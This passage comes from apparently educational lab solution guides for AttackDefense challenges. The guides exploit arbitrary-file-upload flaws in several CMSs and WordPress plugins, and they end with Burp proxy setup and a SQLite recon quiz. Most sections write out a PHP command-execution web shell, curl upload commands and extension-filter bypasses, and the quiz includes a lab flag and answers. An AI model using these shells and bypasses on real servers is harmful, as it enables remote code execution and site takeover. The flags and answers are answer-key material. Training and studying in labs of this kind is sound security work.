 
 
 
 
 
 
 
 
 
Modify the extension from “doc” to “php”. 
 
 
 
Upon clicking okay, the file will not be listed on the web page. 
 
 
 
 
 
 
 
 
 
Step 7: ​Navigate to the URL provided at exploit db link to access the uploaded PHP web shell. 
 
URL: ​http://vec8yps0smsch0vtnxoo125xh.asia.attackdefenselabs.com/userfiles/shell.php 
 
 
 
No output is returned since the cmd parameter was not passed. 
 
 
Step 8: ​Execute system commands through “cmd” GET parameter. 
 
Command: ​id 
 
URL: 
http://vec8yps0smsch0vtnxoo125xh.asia.attackdefenselabs.com/userfiles/shell.php?cmd=id 
 
 
 
The “id” command was executed on the web server and the output was dumped on the web 
page. 
 
 
References:  
 
1.
LibrettoCMS (​https://sourceforge.net/projects/librettocms/​) 
2.
LibrettoCMS 2.2.2 - Arbitrary File Upload (​https://www.exploit-db.com/exploits/26213​)  
 
 
 
 
Name 
WordPress Plugin 
URL 
https://www.attackdefense.com/challengedetails?cid=241  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Login to the web application and identify the installed plugins.  
 
Navigate to the admin login panel, click on the “Log in” hyperlink under “META” section. 
 
 
 
Admin login panel: 
 
 
 
The login credential of the web application is provided in the challenge description: 
 
●
Username: pentester 
●
Password: password1 
 
Admin Dashboard: 
 
 
 
Navigate to the “Plugins” tab on the left panel. 
 
 
 
“Work the Flow File Upload” plugin is installed. 
 
Step 2: ​Search on google “Wordpress Work the Flow File Upload file upload” and look for 
publically available exploits.  
 
 
 
 
The exploit db link contains the steps to be followed in order to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/36640 
 
 
 
 
 
Step 3: ​Create a PHP web shell. 
 
Save the below given php script as shell.php 
 
<?php 
$output = shell_exec($_GET["cmd"]); 
echo "<pre>$output</pre>"; 
?> 
 
Command: ​cat shell.php 
 
 
 
 
 
Step 4: ​Upload the web shell using curl command 
 
Command: ​curl -k -X POST -F "action=upload" -F "files=@./shell.php" 
http://9f8fa39xan4m8igpejgdexdjn.asia.attackdefenselabs.com/wp-content/plugins/work-the-flow
-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php 
 
 
 
The file will be uploaded to the directory 
“/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php
/files/”. 
 
Step 5: ​Access the uploaded PHP script. 
 
URL: 
http://9f8fa39xan4m8igpejgdexdjn.asia.attackdefenselabs.com/wp-content/plugins/work-the-flow
-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/shell.php 
 
 
No output is returned since the cmd parameter was not passed. 
 
Step 6: ​Execute system commands through “cmd” GET parameter. 
 
Command: ​id 
 
URL: 
http://9f8fa39xan4m8igpejgdexdjn.asia.attackdefenselabs.com/wp-content/plugins/work-the-flow
-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/shell.php?cmd=id 
 
 
 
 
 
 
 
The “id” command was executed on the web server and the output was dumped on the web 
page. 
 
 
References:  
 
1.
Work The Flow File Upload (​https://github.com/wp-plugins/work-the-flow-file-upload​)  
2.
WordPress Plugin Work The Flow File Upload 2.5.2 - Arbitrary File Upload 
(​https://www.exploit-db.com/exploits/36640​)  
 
 
 
 
Name 
Flatpress 
URL 
https://www.attackdefense.com/challengedetails?cid=242  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “flatpress file upload” and look for publically available exploits.  
 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter and the 
directory where the uploaded files are stored. The exploit db link also contains a PHP script 
which can be used to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39870  
 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the file upload vulnerability. Login to the 
web application and navigate to the admin panel. 
 
Click on the Login button in the “Admin area” section to navigate to the admin portal. 
 
  
 
 
 
 
Admin Login portal: 
 
 
 
The login credentials of the web application is provided in the challenge description. 
 
●
Username: admin 
●
Password: password 
 
 
 
 
 
 
 
 
 
 
Home Page:  
 
 
 
 
Click on the “Admin panel” in “Admin area” section to access the admin panel. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Navigate to the file upload portal. 
 
Click on the “Uploader” tab of the web application. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 5: ​Create a PHP web shell. 
 
Save the below given php script as shell.php 
 
<?php 
$output = shell_exec($_GET["cmd"]); 
echo "<pre>$output</pre>"; 
?> 
 
Command: ​cat ~/Downloads/shell.php 
 
 
 
Step 6: ​Upload the PHP web shell on the web server. 
 
Click on one of the “Browse” button and upload the PHP web shell. 
 
 
 
Click on the Upload button. 
 
 
 
 
 
Upon successful upload, “File(s) uploaded” message will be displayed.  
 
 
 
Step 7: ​Navigate to the directory where the files are uploaded and open the uploaded PHP 
script. 
 
Directory: ​/fp-content/attachs 
 
URL: ​http://5nrxcs0nbb6rmfztll0zsqa98.asia.attackdefenselabs.com/fp-content/attachs/ 
 
 
 
 
 
 
 
 
 
Open the uploaded PHP script. 
 
URL: ​http://5nrxcs0nbb6rmfztll0zsqa98.asia.attackdefenselabs.com/fp-content/attachs/shell.php 
 
 
No output is returned since the cmd parameter was not passed. 
 
Step 8: ​Execute system commands through “cmd” GET parameter. 
 
Command: ​id 
 
URL: 
http://5nrxcs0nbb6rmfztll0zsqa98.asia.attackdefenselabs.com/fp-content/attachs/shell.php?cmd
=id 
 
 
 
The “id” command was executed on the web server and the output was dumped on the web 
page. 
 
 
References:  
 
1.
FlatPress (​https://www.flatpress.org/​)  
2.
Flatpress 1.0.3 - Cross-Site Request Forgery / Arbitrary File Upload 
(​https://www.exploit-db.com/exploits/39870​)  
 
 
 
 
Name 
Joomla Component 
URL 
https://www.attackdefense.com/challengedetails?cid=243  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Login to the web application and identify the installed components. The login credential of the 
web application is provided in the challenge description: 
 
●
Username: admin 
●
Password: password 
 
Admin Dashboard: 
 
 
 
Click on the “Extension Manager” thumbnail. 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the “Manage” tab and select “Component” in the “Select Type” drop box (2nd drop 
down from right) 
 
 
 
Joomla Component Collector is installed. 
 
 
 
Step 2: ​Search on google “joomla component collector file upload exploit db” and look for 
publically available exploits.  
 
 
 
The exploit db link contains the steps to be followed in order to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/24228 
 
 
 
 
 
 
 
 
Step 3: ​Create a PHP web shell. 
 
Save the below given php script as shell.php 
 
<?php 
$output = shell_exec($_GET["cmd"]); 
echo "<pre>$output</pre>"; 
?> 
 
Command: ​cat ~/Downloads/shell.php 
 
 
 
 
 
 
Step 4: ​Navigate to the target URL provided at exploit db link. 
 
URL: 
http://6ywugr8dcobb7ywdjpmia1jps.asia.attackdefenselabs.com/joomla/index.php?option=com_
collector&view=filelist&tmpl=component&folder=&type=1 
 
 
 
Click on the “Browse” button and upload the PHP web shell. 
 
 
 
 
 
 
 
 
 
 
 
Click on the “Start upload” button. 
 
 
 
Once the file is uploaded, The request will redirect to the same web page.  
 
 
 
 
 
 
 
 
 
 
 
 
The file/folder list displayed on the web page contains “administrator” folder and other folder of 
joomla cms. Since the admin portal was located at “/joomla/administrator”, it can be concluded 
that the files/folders listed on the web page are present inside the “/joomla” directory on the web 
server.  
 
The PHP scripts are not listed. Since the web shell was uploaded to the default directory which 
in this case is the directory “/joomla”, it can be concluded that the uploaded web shell is also 
present in the same directory.  
 
 
 
Step 5: ​Access the uploaded PHP script. 
 
URL: ​http://6ywugr8dcobb7ywdjpmia1jps.asia.attackdefenselabs.com/joomla/shell.php 
 
 
 
No output is returned since the cmd parameter was not passed. 
 
Step 6: ​Execute system commands through “cmd” GET parameter. 
 
Command: ​id 
 
URL: ​http://6ywugr8dcobb7ywdjpmia1jps.asia.attackdefenselabs.com/joomla/shell.php?cmd=id 
 
 
 
The “id” command was executed on the web server and the output was dumped on the web 
page. 
 
 
References:  
 
1.
Collector Component for Joomla (​http://www.steevo.fr/en​) 
2.
Joomla! Component com_collector - Arbitrary File Upload 
(​https://www.exploit-db.com/exploits/24228​)  
 
 
 
Name 
Redaxo Mediapool Addon 
URL 
https://www.attackdefense.com/challengedetails?cid=432  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “Redaxo Mediapool Addon file upload” and look for publically 
available exploits.  
 
 
 
 
The exploit db link contains the information regarding the blacklisted file extensions. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/44891 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the file upload vulnerability. Login to the 
web application and navigate to the URL provided at exploit db link. 
 
The login credential of the web application is provided in the challenge description: 
 
●
Username: admin 
●
Password: password 
 
 
 
 
URL: 
http://ipe0q1cb3d09anto1rnamn6hw.asia.attackdefenselabs.com/redaxo/redaxo/index.php?pag
e=mediapool/media 
 
 
 
Step 4: ​Create a PHP web shell. 
 
Save the below given php script as shell.php71 
 
<?php 
$output = shell_exec($_GET["cmd"]); 
echo "<pre>$output</pre>"; 
?> 
 
Command: ​cat shell.php71 
 
 
 
Step 5: ​Upload the PHP web shell to the webserver. 
 
Click on the “Add file” tab. 
 
 
 
 
 
 
Click on the Browse button and upload the PHP web shell. 
 
 
 
Fill the form with any data and click on the “Add” button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on Uploaded file “test”.  
 
 
 
Step 6: ​Open the uploaded PHP script. 
 
URL: 
http://ipe0q1cb3d09anto1rnamn6hw.asia.attackdefenselabs.com/redaxo/media/shell.php71 
 
 
 
No output is returned since the cmd parameter was not passed. 
 
Step 7: ​Execute system commands through “cmd” GET parameter. 
 
Command: ​id 
 
URL: 
http://ipe0q1cb3d09anto1rnamn6hw.asia.attackdefenselabs.com/redaxo/media/shell.php71?cm
d=id 
 
 
 
The “id” command was executed on the web server and the output was dumped on the web 
page. 
 
 
 
 
 
References:  
 
1.
Media pool (​https://redaxo.org/download/addons/mediapool/​)  
2.
Redaxo CMS Mediapool Addon < 5.5.1 - Arbitrary File Upload 
(​https://www.exploit-db.com/exploits/44891​)  
 
 
 
 
Name 
Chilly CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=433  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “chillycms file upload” and look for publically available exploits.  
 
 
 
 
 
The exploit db link contains a python script which can be used to exploit the vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/34641 
 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Modify the host and path in the python script provided at the Exploit DB link and save it 
as exploit.py 
 
Modify variables​:  
host = 'v6oz4d8y8p9odtnvteamee1p0.asia.attackdefenselabs.com' 
path = '' 
 
Modify the host header in the request 
 
Host: v6oz4d8y8p9odtnvteamee1p0.asia.attackdefenselabs.com 
 
Command: ​cat exploit.py 
 
 
 
 
 
 
 
 
 
The python script will upload a PHP web shell. The uploaded web shell will requires “CMD” 
parameter to be passed  to it in a GET request. 
 
Step 4: ​Execute the python script to upload the web shell. 
 
Command: ​python exploit.py 
 
 
 
The PHP web shell was uploaded successfully. 
 
Step 5: ​Execute system commands by passing “CMD” parameter to the PHP web shell. 
 
Command: ​id 
 
URL: ​http://v6oz4d8y8p9odtnvteamee1p0.asia.attackdefenselabs.com/tmp/shell.php?CMD=id 
 
 
 
 
 
 
 
 
 
 
References:  
 
1.
ChillyCMS 2.3.4.3 - Arbitrary File Upload (​https://www.exploit-db.com/exploits/34641​)  
 
 
 
 
 
Name 
WordPress Thumbnail Slider 
URL 
https://www.attackdefense.com/challengedetails?cid=434  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “WordPress Thumbnail Slider file upload exploit db” and look for 
publically available exploits.  
 
 
 
The exploit db link contains the steps to be followed in order to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/37998  
 
 
 
 
 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. 
 
Click on the “Log in” hyperlink under the “META” section. 
 
 
 
 
 
 
 
 
The login credential of the web application is provided in the challenge description: 
 
●
Username: admin 
●
Password: password1 
 
Admin Dashboard: 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Navigate to the Image upload portal. 
 
Hover over the “Responsive Thumbnail Slider” tab on the left panel and click on the “Manage 
Images” button. 
 
 
 
 
Step 5: ​Create a PHP web shell. 
 
Save the below given php script as “shell.php.jpg” 
 
<?php 
$output = shell_exec($_GET["cmd"]); 
echo "<pre>$output</pre>"; 
?> 
 
Command: ​cat shell.php.jpg 
 
 
 
Step 6: ​Click on the “Browse” button and upload the PHP web shell. 
 
 
 
 
 
 
 
Click on “Save Changes” button and intercept the request with burp suite. 
 
Check Appendix to learn how to configure Burp Suite. 
 
Intercepted Request: 
 
 
 
Modify the filename and content-type 
 
Modify the filename: 
 
Before: ​shell.php.jpg 
 
After: ​shell.php 
 
Modify the Content-Type 
 
Before: ​image/jpeg 
 
After: ​application/x-httpd-php 
 
 
 
Forward the request and turn off the intercept 
 
 
 
The file was uploaded successfully. 
 
Step 7: ​Access the uploaded web shell. 
 
Right click on the broken image and click on “Copy Image Location”. 
 
 
 
Open a new tab and navigate to the copied image location. 
 
URL: 
http://k3dhoe7iyjp3bxrkpmwt10nog.asia.attackdefenselabs.com/wp-content/uploads/wp-respons
ive-images-thumbnail-slider/f85d4d6e53eaa281ad55518357050a8c.php 
 
 
 
No output is returned since the cmd parameter was not passed. 
 
Step 8: ​Execute system commands through “cmd” GET parameter. 
 
Command: ​id 
 
URL: 
http://k3dhoe7iyjp3bxrkpmwt10nog.asia.attackdefenselabs.com/wp-content/uploads/wp-respons
ive-images-thumbnail-slider/f85d4d6e53eaa281ad55518357050a8c.php?cmd=id 
 
 
 
The “id” command was executed on the web server and the output was dumped on the web 
page. 
 
 
References:  
 
1.
wordpress responsive thumbnail carousel slider 
(​https://wordpress.org/plugins/wp-responsive-thumbnail-slider/​) 
2.
WordPress Plugin Responsive Thumbnail Slider 1.0 - Arbitrary File Upload 
(​https://www.exploit-db.com/exploits/37998​)  
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
Name 
DirLIST 
URL 
https://www.attackdefense.com/challengedetails?cid=435  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “dirlist file upload” and look for publically available exploits.  
 
 
 
The exploit db link contains the steps to be followed in order to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/41083 
 
 
 
 
 
 
 
 
 
 
Step 3: ​Create a PHP web shell. 
 
Save the below given php script as “shell.php.;” 
 
<?php 
$output = shell_exec($_GET["cmd"]); 
echo "<pre>$output</pre>"; 
?> 
 
Command: ​cat "shell.php.;" 
 
 
 
 
Step 4: ​Click on one of the “Browse” button and open the PHP web shell. 
 
 
 
Click on the “Upload” button. 
 
 
 
 
Upon successful upload, the file will be listed on the web page. 
 
 
 
Step 5: ​Access the uploaded PHP script by clicking on the thumbnail. 
 
URL: ​http://zhjoohwbr0dqc35uwo1lm0wqu.asia.attackdefenselabs.com/shell.php.%3B 
 
 
 
No output is returned since the cmd parameter was not passed. 
 
 
 
 
Step 6: ​Execute system commands through “cmd” GET parameter. 
 
 
Command: ​id 
 
URL: ​http://zhjoohwbr0dqc35uwo1lm0wqu.asia.attackdefenselabs.com/shell.php.%3B?cmd=id 
 
 
 
The “id” command was executed on the web server and the output was dumped on the web 
page. 
 
 
References:  
 
1.
dirLIST - PHP Directory Lister (​https://sourceforge.net/projects/dir-list/​) 
2.
dirLIST 0.3.0 - Arbitrary File Upload (​https://www.exploit-db.com/exploits/41083​)  
 
 
 
 
 
Name 
WordPress wpStoreCart 
URL 
https://www.attackdefense.com/challengedetails?cid=471  
Type 
Real World Webapps : File Upload 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “WordPress wpStoreCart file upload” and look for publically available 
exploits.  
 
 
 
 
The exploit db link contains a php script which can be used to exploit the vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/19023 
 
 
 
 
 
 
 
Analysis of the PHP script reveals that the file is uploaded to the vulnerable web page 
“/wp-content/plugins/wpstorecart/php/upload.php”. 
 
Step 3: ​Create a PHP web shell. 
 
Save the below given php script as shell.php 
 
<?php 
$output = shell_exec($_GET["cmd"]); 
echo "<pre>$output</pre>"; 
?> 
 
Command: ​cat shell.php 
 
 
 
Step 4: ​Upload the web shell using curl command 
 
Command: ​curl -F "Filedata=@./shell.php" 
http://ekd8eic4ygc4gflttkrovrbt4.asia.attackdefenselabs.com/wp-content/plugins/wpstorecart/php
/upload.php 
 
 
 
The file will be uploaded to the directory “/wp-content/uploads/wpstorecart/”. 
 
Step 5: ​Access the uploaded PHP script. 
 
URL: 
http://ekd8eic4ygc4gflttkrovrbt4.asia.attackdefenselabs.com/wp-content/uploads/wpstorecart/sh
ell.php 
 
 
 
 
No output is returned since the cmd parameter was not passed. 
 
Step 6: ​Execute system commands through “cmd” GET parameter. 
 
Command: ​id 
 
URL: 
http://ekd8eic4ygc4gflttkrovrbt4.asia.attackdefenselabs.com/wp-content/uploads/wpstorecart/sh
ell.php?cmd=id 
 
 
 
 
 
 
 
 
 
The “id” command was executed on the web server and the output was dumped on the web 
page. 
 
 
References:  
 
1.
wpStoreCart (​https://github.com/wp-plugins/wpstorecart​) 
 
2.
WordPress Plugin wpStoreCart 2.5.27-2.5.29 - Arbitrary File Upload 
(​https://www.exploit-db.com/exploits/19023​)  
 
 
 
 
Name 
SQLite Recon: Basics 
URL 
https://www.attackdefense.com/challengedetails?cid=528  
Type 
Network Recon : SQL Databases 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Q1. What is the version of Sqlite? 
 
Answer:​ 3.22.0 
 
Command: ​sqlite3 --version 
 
 
 
Commands:  
sqlite3  
select sqlite_version(); 
 
 
 
 
 
 
Q2. List the name of tables present inside “data.db”. 
 
Answer: ​FLAG, app 
 
Commands: 
sqlite3 data.db 
.tables 
 
 
 
Q3. List the column names of table “app” present in “data.db”. 
 
Answer: ​NAME, AGE, ADDRESS 
 
Command:​ .schema app 
 
 
 
Q4. Fetch the flag from “FLAG” table present in “data.db”. 
 
Answer: ​44dd29a07a0086948ad19ad6376db7d6 
 
Command:​ select * from flag; 
 
 
 
 
 
Q5. How many records are stored in “employees” table in “chinook.db” ? 
 
Answer: ​8 
 
Commands: 
sqlite3 chinook.db 
select count(*) from employees; 
 
 
 
Q6. How many artists have their name start with “The” in “artists” table in “chinook.db” ? 
 
Answer: ​14 
 
Commands: 
.schema artists 
select count(*) from artists where name glob 'The*'; 
 
 
 
Q7. What is the title of the 6th album in “albums” table sorted alphabetically in 
“chinook.db” ? 
 
Answer: ​A Real Live One 
 
 
 
Commands: 
.schema albums 
select title from albums order by title limit 5,1; 
 
 
 
Q8. How many records have “total” between 2 and 6 in “invoices” table in “chinook.db” ? 
 
Answer: ​119 
 
